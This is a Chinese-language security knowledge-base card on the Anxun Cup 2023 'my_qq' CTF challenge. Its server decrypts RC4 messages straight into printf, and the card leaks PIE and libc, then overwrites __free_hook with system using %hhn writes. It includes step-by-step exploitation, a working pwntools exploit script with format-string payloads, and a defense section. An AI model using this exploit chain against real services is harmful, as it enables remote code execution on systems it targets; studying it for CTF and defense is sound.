---
id: binary-pwn-format-string-rc4-decrypted-message-freehook-system
title: RC4 加密消息解密后直入 printf：%15$s 读 GOT 泄 PIE/libc，%15$hhn 六字节覆写 __free_hook 为 system
type: scenario
domain: binary
path: binary/pwn/format-string
technique: rc4-decrypted-message-format-string-freehook-system
tags:
- pwn
- ctf
- format-string
- rc4
- rsa
- free-hook
- got
- arbitrary-read
- arbitrary-write
- glibc231
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V292
  verified_at: '2026-11-08T08:26:21+08:00'
  notes: 已对照全文与 4 张图核对。原文 exp 关键链均与卡一致：注册/登录后从 server_p 读 RC4 key、session() 先 RC4 再 hex、%p 泄栈、%15+extra 指针读栈返回地址减 0x3208 得 ELF、读 malloc@got(0x6f50) 得 libc、6 次 %<byte>c%15 写 __free_hook、最后发 /bin/sh 触发 free->system。已修正卡内两处“发送普通明文 /bin/sh”表述为“通过 session() 发送解密后为 /bin/sh 的消息（线上仍 RC4+hex）”，避免读者误发明文。affected_versions 原为题目提供的 libc-2.31.so（目标环境），非受影响区间，已 --clear；卡内正文仍注明依赖 __free_hook（glibc<2.34）。未验证点：%15$ 参数索引、72 字节补齐、栈偏移 0x400+0x800+0x30+8 与 0x3208/0x6f50 均为题目布局；文章未给出 server 端 free 消息缓冲区的反编译片段，free->system 触发点为依据 exp 的合理推断；PoC 未复跑。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-rc4-decrypted-message-freehook-system/
draft: false
kb_aliases:
- 安洵杯2023 my_qq
- my_qq
- RC4 密文格式化字符串
- 加密信道格式化字符串
- free_hook 六字节写
- 解密后直入 printf
---

## 一句话结论

在安洵杯 2023 `my_qq` 里，服务端把客户端消息先 hex 解码、再 RC4 解密，然后把明文直接当格式化字符串输出；由于 RC4 密钥会从调试连接打印给客户端，攻击者可构造解密后为 `%p` / `%15$s` / `%15$hhn` 的密文，先用 `%p` 泄栈、用密文后附加的指针配合 `%15$s` 任意读（泄 PIE 与 libc），再用 6 次 `%15$hhn` 把 `__free_hook` 写成 `system`，最后发送 `/bin/sh`，让服务端 free 该消息时执行 `system("/bin/sh")` 拿到 shell。

## 原理

- **协议**：客户端先注册（16 字节用户名 + 64 字节口令 SHA-256），再登录；登录后服务端通过调试连接打印 16 字节 RC4 密钥（实际 17 字节，末字节为 NUL），之后客户端发送的消息用该密钥 RC4 加密并 hex 编码。RSA 公钥交换只是流程的一部分：服务端 `strcmp` 校验的是注册时保存的公钥，攻击者用自己的 RSA 密钥对注册、登录即可，公钥交换本身不构成障碍。
- **解密后直入格式化输出**：服务端收到 hex 串后先做 hex 解码、再 RC4 解密，然后把解密出的明文交给 `printf` 一类函数（不是 `printf("%s", buf)`）。RC4 是对称且密钥已知的可逆运算，所以“加密”不影响攻击者完全控制解密后的字节；加密层只是让明文在网络上看不见，服务端解密后仍把攻击者数据当格式串。
- **为什么能任意读**：`printf` 的 `%N$s` 会从第 N 个可变参数位置取一个指针并按 C 字符串打印。`session()` 把密文 hex 串用 NUL 补齐到 `9*8=72` 字节，再在末尾附加原始字节 `extra`；这些附加字节落在服务端消息缓冲区中并成为可控的变参（文章定位到第 15 个）。于是 `%15$s` + `p64(target)` 就能读出 `target` 处的内存直到 NUL。读 8 字节后补两个 NUL 用 `u64` 还原指针，是这套泄漏的收尾细节。
- **PIE 泄漏**：先把 `%p` 的输出当栈地址；再读该栈地址加上固定偏移（文章为 `+0x400+0x800+0x30+8`）处保存的、指向二进制代码段的返回地址，用 `u64` 读出后减去 `0x3208` 得到 ELF 基址。
- **libc 泄漏**：用同一条 `%15$s` 任意读指向 ELF 中的 `malloc@got`（文章偏移 `0x6f50`），读出 libc 中 `malloc` 的真实地址，减去题目 libc 的 `malloc` 偏移得到 libc 基址。
- **为什么能任意写**：`%<n>c%15$hhn` 会把“目前打印了多少字符”的低字节写到第 15 个参数指向的地址。每次消息在 `extra` 里只放一个目标字节地址 `__free_hook+i`，把该字节写成 `system` 地址的第 i 个字节；`system` 在高位地址空间里是 6 字节有效（0x00007f...），所以 6 条消息即可拼出完整指针，`__free_hook` 高两字节原本为零。
- **触发**：`__free_hook` 被写成 `system` 后，再通过同一 `session()` 发送一条解密后为 `/bin/sh` 的消息（线上仍是 RC4+hex，并非裸明文）；服务端对该消息缓冲区执行 `free()` 时，glibc 转去调用 `system(buf)`，即 `system("/bin/sh")`。shell 的标准输入输出落在服务端进程的调试连接上，所以文章最后对 `server_p` 做 `interactive()`。
- **依赖**：glibc 2.31（有 `__free_hook`，且没有 safe-linking 等与本题无关的改动）；服务端必须把解密结果当格式串用，且消息布局允许把指针附加到可预测的变参位置。

## 触发条件

- 网络服务对客户端密文解密后，把明文作为 `printf`/`snprintf`/`syslog` 的格式参数（而不是格式串参数）。
- 加密密钥可被攻击者获得（本题由调试通道直接打印；其他场景可能是硬编码密钥、弱 KDF 或密钥交换缺陷）。
- 协议允许在密文之后附加原始字节，且附加数据能落在格式化函数的可控变参位置；文章通过把 hex 串补齐到 72 字节，使 `p64` 落在第 15 个参数。
- 目标为 glibc 2.31（或至少 2.34 之前存在 `__free_hook` 的版本），且 `__free_hook` 未被禁用。
- 已能从栈泄漏 PIE、从 GOT 泄漏 libc；二进制为 PIE 时这是计算地址的必要步骤。

## 利用步骤

1. 建立两条连接：一条是挑战服务的调试/管理连接（文章 `server_p`），一条是普通客户端连接（`p1`）；注册时发送 16 字节用户名和 64 字节 SHA-256 口令哈希，并用自己的 RSA 公钥完成交换。
2. 登录，从调试连接读取 `RC4 key is <hex>`，得到 16 字节 RC4 密钥（后随 NUL）。
3. 封装 `session(data, pad_to, extra)`：`data + b'\x00'` 先 RC4 加密，再 hex 编码；用 `\x00` 补齐到 `pad_to`（文章 72 字节）；末尾追加 `extra`（如 `p64(addr)`）后发送；从调试连接读取服务端打印的解密结果。
4. 发送 `%p`，把返回值按十六进制解析为栈地址。
5. 发送 `%15$s`，`extra=p64(stack_addr+0x400+0x800+0x30+8)`；读 8 字节后减去 `0x3208` 得 ELF 基址。
6. 发送 `%15$s`，`extra=p64(elf_base+0x6f50)`（`malloc@got`）；读 8 字节后减去 libc 的 `malloc` 偏移得 libc 基址。
7. 对 `i=0..5` 依次发送 `%<((system>>(8*i))&0xff)>c%15$hhn`，`extra=p64(libc_base+__free_hook+i)`；6 条消息把 `system` 写入 `__free_hook`。
8. 通过 `session()` 发送解密后为 `/bin/sh` 的消息（线上 RC4+hex）；服务端 free 该缓冲区时执行 `system("/bin/sh")`，对调试连接执行 `interactive()` 拿 shell。

## PoC

最小骨架（主机、端口、栈偏移与 libc 符号按目标调整；关键是把地址放进 `extra`、把 hex 密文补齐到 72 字节）：

```python
from pwn import *
from Crypto.PublicKey import RSA
from Crypto.Cipher import ARC4

context(os='linux', arch='amd64', log_level='info')
libc = ELF('./libc-2.31.so', checksec=False)

# server_p: 调试/管理连接；p: 普通客户端连接
def session(p, server_p, key, data, pad_to=0, extra=b''):
    data = ARC4.new(key).encrypt(data + b'\x00').hex().encode()
    if pad_to:
        data = data.ljust(pad_to, b'\x00')
    p.send(data + extra)
    server_p.recvuntil(b'The decode  rc4_msg is')
    server_p.recvline()
    return server_p.recvuntil(b' \n', drop=True)

# 注册/登录并完成 RSA 交换后，从调试连接取得 key（16 字节）
# ... 注册与登录细节见原文协议，核心是 p.send(name.ljust(16,b'\x00') + hash.ljust(64,b'?')) ...

stack = int(session(p, server_p, key, b'%p'), 16)
elf_base = u64(session(p, server_p, key, b'%15$s', 9 * 8,
                       p64(stack + 0x400 + 0x800 + 0x30 + 8)) + b'\x00\x00') - 0x3208
libc_base = u64(session(p, server_p, key, b'%15$s', 9 * 8,
                        p64(elf_base + 0x6f50)) + b'\x00\x00') - libc.sym['malloc']
system = libc_base + libc.sym['system']

for i in range(6):
    byte = (system >> (8 * i)) & 0xff
    session(p, server_p, key, b'%' + str(byte).encode() + b'c%15$hhn', 9 * 8,
            p64(libc_base + libc.sym['__free_hook'] + i))

session(p, server_p, key, b'/bin/sh')   # free -> system("/bin/sh")
server_p.interactive()
```

## 变体与关联

- **变体：不经栈泄 PIE**。若二进制非 PIE，可直接用 `%N$s` 读 GOT；或读 `__libc_start_main` 返回地址等固定栈位置。本题的 `%p` + 栈偏移路线依赖栈布局，换题要重新定位。
- **变体：单次写而不是 6 次**。若目标 libc 与 `system` 只差低 2 字节，可用 `%hn` 两次写；若已有 `one_gadget`，可把 `__free_hook` 写成 one-gadget 地址。
- **变体：加密层换成 XOR/自定义流密码**。只要密钥已知且服务端解密后仍把明文当格式串，本链不变；加密只是让明文在流量里不可见，不提供任何输入约束。
- **变体：没有 `__free_hook`（glibc 2.34+）**。改打 `_IO_list_all`、`exit_funcs`、`tcache_perthread_struct` 等，或用格式串直接写返回地址/`__malloc_hook`（若存在）。
- **关联**：[[binary-pwn-format-string-freehook-printf-stack-leak]]（把 `__free_hook` 写成 `printf` 反过来用 free 触发格式化串）、[[binary-pwn-format-string-got-hijack]]（格式化串写 GOT）、[[binary-pwn-format-string-decode-after-filter-bypass]]（先过滤后解码的同类“编码层不等于安全边界”问题）、[[ctf-pwn-justledger-sqlite-extension-free-list-lowbyte-format-string-chain]]（密文/混淆参数进格式化串的多级链）。
- **边界**：服务端若用 `printf("%s", buf)`、在解密后做格式化字符过滤、或不把密钥交给客户端，本链不成立；`%15$` 的索引和 `9*8` 的补齐值都是题目布局相关，不能直接套用到其他程序。

## 检测与防御

- **修复**：把 `printf(buf)` 改成 `printf("%s", buf)` 或 `puts(buf)`；对解密后的消息只做数据使用，不作为格式串。
- **密钥管理**：不要把 RC4 密钥打印到调试通道/日志；不要在客户端可控的通道上回传密钥或明文。
- **工程加固**：编译时启用 `-D_FORTIFY_SOURCE=2`、PIE、Full RELRO；glibc 升级到 2.34+ 移除 `__free_hook`/`__malloc_hook`；对网络协议做严格长度与字符集校验。
- **检测**：服务端日志/流量中出现 `%p`、`%N$s`、`%N$hhn` 等格式化序列（即使在 hex 编码后也应能通过解码发现）；同一连接短时间内多次发送长度异常、尾部带二进制指针的密文；`__free_hook` 被写成 libc 内 `system` 等地址；服务进程异常执行 `/bin/sh`。
